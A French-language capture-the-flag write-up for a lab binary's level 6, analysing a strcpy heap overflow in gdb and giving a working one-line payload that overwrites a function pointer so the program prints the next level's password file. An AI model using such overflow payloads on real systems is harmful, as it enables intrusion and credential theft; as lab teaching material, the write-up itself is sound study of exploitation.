## Level 6

### Analyse
Le main alloue deux blocs sur le heap : un buffer de 64 bytes (0x40) et un pointeur de fonction de 4 bytes. Ce pointeur est initialisé avec l'adresse de m (0x8048468), puis appelé à la fin. strcpy copie argv[1] dans le buffer sans vérification — vulnérabilité heap overflow.

```bash
(gdb) disas main
   0x08048485 <+9>:     movl   $0x40,(%esp)          # malloc(64) → buffer
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048495 <+25>:    movl   $0x4,(%esp)           # malloc(4) → pointeur de fonction
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a5 <+41>:    mov    $0x8048468,%edx        # adresse de m → pointeur
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt> # overflow ici
   0x080484d0 <+84>:    call   *%eax                  # appel du pointeur de fonction

(gdb) disas n
   0x0804845a <+6>:     movl   $0x80485b0,(%esp)
   0x08048461 <+13>:    call   0x8048370 <system@plt>

(gdb) x/s 0x80485b0
0x80485b0:       "/bin/cat /home/user/level7/.pass"
```
```n (0x08048454)``` appelle ```system("/bin/cat /home/user/level7/.pass")``` mais n'est jamais appelée. L'objectif est d'écraser le pointeur de fonction avec l'adresse de n.

### Exploitation
Les deux blocs malloc étant contigus sur le heap, un overflow du buffer écrase le pointeur de fonction. L'offset est de 72 bytes.

```bash
$ ./level6 $(python -c 'print "B"*72+"\x54\x84\x04\x08"')
```
